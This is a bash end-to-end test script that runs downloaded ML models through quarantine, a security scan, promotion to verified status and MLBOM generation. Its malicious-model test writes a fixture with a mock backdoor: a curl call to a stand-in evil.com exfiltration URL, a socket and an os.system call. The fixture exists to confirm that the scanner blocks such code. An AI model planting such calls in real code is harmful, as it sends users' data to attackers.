#!/bin/bash
#
# E2E Secure Model Deployment Test
#
# Tests the complete security pipeline:
#   1. Download model to quarantine
#   2. Run security scan
#   3. Promote to verified (if passed)
#   4. Generate MLBOM
#
# This script demonstrates how consumer projects can integrate
# the model-security module for secure model deployment.
#
# Usage:
#   ./e2e_secure_deploy.sh [model-id] [options]
#
# Options:
#   --force              Re-download existing model
#   --keep-quarantine    Don't clean up quarantine after test
#   --test-malicious     Test with a known problematic model
#
# Example:
#   ./e2e_secure_deploy.sh openai-community/gpt2
#   ./e2e_secure_deploy.sh --test-malicious

set -euo pipefail

# =============================================================================
# CONFIGURATION
# =============================================================================

# Default to a small, safe model for testing
MODEL_ID="${1:-openai-community/gpt2}"
MODEL_NAME="${MODEL_ID##*/}"

# Test directories (use temp by default)
TEST_DIR="${TEST_DIR:-/tmp/model-security-test}"
QUARANTINE_DIR="${TEST_DIR}/quarantine"
VERIFIED_DIR="${TEST_DIR}/verified"
SCAN_RESULTS_DIR="${TEST_DIR}/scan-results"

# Script location
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MODULE_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

# Flags
FORCE_DEPLOY=false
KEEP_QUARANTINE=false
TEST_MALICIOUS=false

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info()    { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[⚠]${NC} $1"; }
log_error()   { echo -e "${RED}[✗]${NC} $1"; }
log_header()  { echo -e "\n============ $1 ============\n"; }

# =============================================================================
# PARSE ARGUMENTS
# =============================================================================

for arg in "$@"; do
    case $arg in
        --force)           FORCE_DEPLOY=true ;;
        --keep-quarantine) KEEP_QUARANTINE=true ;;
        --test-malicious)  TEST_MALICIOUS=true ;;
        -*)                ;; # Skip other flags
        *)                 MODEL_ID="$arg"; MODEL_NAME="${MODEL_ID##*/}" ;;
    esac
done

# =============================================================================
# SETUP
# =============================================================================

setup() {
    log_header "Setup Test Environment"
    
    # Create directories
    mkdir -p "$QUARANTINE_DIR" "$VERIFIED_DIR" "$SCAN_RESULTS_DIR"
    
    # Verify Python modules are available
    if ! python3 -c "import sys; sys.path.insert(0, '$MODULE_DIR'); from scanner import ModelSecurityScanner" 2>/dev/null; then
        log_error "Model security module not found at: $MODULE_DIR"
        exit 1
    fi
    
    log_success "Test environment ready: $TEST_DIR"
    log_info "Module: $MODULE_DIR"
}

# =============================================================================
# DOWNLOAD MODEL
# =============================================================================

download_model() {
    log_header "Download Model to Quarantine"
    
    if [ -d "$QUARANTINE_DIR/$MODEL_NAME" ] && [ "$FORCE_DEPLOY" != "true" ]; then
        log_info "Model exists in quarantine. Use --force to re-download"
        return 0
    fi
    
    rm -rf "$QUARANTINE_DIR/$MODEL_NAME"
    
    python3 "$MODULE_DIR/downloader.py" \
        "$MODEL_ID" \
        --output-dir "$QUARANTINE_DIR" \
        --safetensors-only
    
    log_success "Download complete: $QUARANTINE_DIR/$MODEL_NAME"
}

# =============================================================================
# CREATE MALICIOUS TEST MODEL
# =============================================================================

create_malicious_model() {
    log_header "Create Malicious Test Model"
    
    MODEL_NAME="test-malicious-model"
    MODEL_PATH="$QUARANTINE_DIR/$MODEL_NAME"
    
    mkdir -p "$MODEL_PATH"
    
    # Create a config.json
    cat > "$MODEL_PATH/config.json" << 'EOF'
{
    "model_type": "test",
    "hidden_size": 128
}
EOF
    
    # Create a malicious Python file
    cat > "$MODEL_PATH/modeling_malicious.py" << 'EOF'
import os
import subprocess
import socket

def backdoor():
    # Dangerous patterns that should be detected
    subprocess.run(["curl", "http://evil.com/exfiltrate"])
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    os.system("whoami")
EOF
    
    # Create a pickle file (should be blocked)
    touch "$MODEL_PATH/model.pt"
    
    log_warning "Created malicious test model with:"
    log_warning "  - Dangerous code patterns (subprocess, socket, os.system)"
    log_warning "  - Blocked format (.pt pickle file)"
}

# =============================================================================
# SECURITY SCAN
# =============================================================================

security_scan() {
    log_header "Security Scan"
    
    local model_path="$QUARANTINE_DIR/$MODEL_NAME"
    local scan_file="$SCAN_RESULTS_DIR/${MODEL_NAME}_$(date +%Y%m%d_%H%M%S).json"
    
    log_info "Scanning: $model_path"
    
    if python3 "$MODULE_DIR/scanner.py" \
        "$model_path" \
        --output "$scan_file"; then
        log_success "Security scan PASSED"
        return 0
    else
        log_error "Security scan FAILED"
        log_info "Results saved: $scan_file"
        
        # Show findings
        echo ""
        python3 -c "
import json
with open('$scan_file') as f:
    result = json.load(f)
print('Findings:')
for f in result.get('findings', []):
    print(f\"  [{f['severity']}] {f['category']}: {f['message']}\")
"
        return 1
    fi
}

# =============================================================================
# PROMOTE MODEL
# =============================================================================

promote_model() {
    log_header "Promote to Verified"
    
    rm -rf "$VERIFIED_DIR/$MODEL_NAME"
    mv "$QUARANTINE_DIR/$MODEL_NAME" "$VERIFIED_DIR/$MODEL_NAME"
    
    log_success "Model promoted: $VERIFIED_DIR/$MODEL_NAME"
}

# =============================================================================
# GENERATE MLBOM
# =============================================================================

generate_mlbom() {
    log_header "Generate MLBOM"
    
    python3 "$MODULE_DIR/mlbom.py" \
        "$VERIFIED_DIR/$MODEL_NAME" \
        --model-id "$MODEL_ID" \
        --scan-passed
    
    log_success "MLBOM generated"
}

# =============================================================================
# CLEANUP
# =============================================================================

cleanup() {
    if [ "$KEEP_QUARANTINE" != "true" ]; then
        log_info "Cleaning up test directory..."
        rm -rf "$TEST_DIR"
    fi
}

# =============================================================================
# MAIN
# =============================================================================

echo ""
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     Model Security - E2E Deployment Test                      ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""

# Setup
setup

# Prepare model
if [ "$TEST_MALICIOUS" = "true" ]; then
    create_malicious_model
    log_info "Testing malicious model (expect FAILURE)"
else
    log_info "Model: $MODEL_ID"
    download_model
fi

echo ""

# Run security pipeline
if security_scan; then
    promote_model
    generate_mlbom
    
    log_header "Test PASSED ✓"
    echo "Model verified and ready at: $VERIFIED_DIR/$MODEL_NAME"
    echo "MLBOM: $VERIFIED_DIR/$MODEL_NAME/mlbom.json"
    
    EXIT_CODE=0
else
    log_header "Test Result: Security Blocked"
    
    if [ "$TEST_MALICIOUS" = "true" ]; then
        log_success "Expected behavior: Malicious model was blocked!"
        EXIT_CODE=0
    else
        log_error "Unexpected: Model failed security scan"
        EXIT_CODE=1
    fi
    
    echo ""
    echo "Model remains in quarantine: $QUARANTINE_DIR/$MODEL_NAME"
    echo "Scan results: $SCAN_RESULTS_DIR/"
fi

# Cleanup unless keeping
[ "$KEEP_QUARANTINE" != "true" ] && [ "$EXIT_CODE" = "0" ] && cleanup

exit $EXIT_CODE
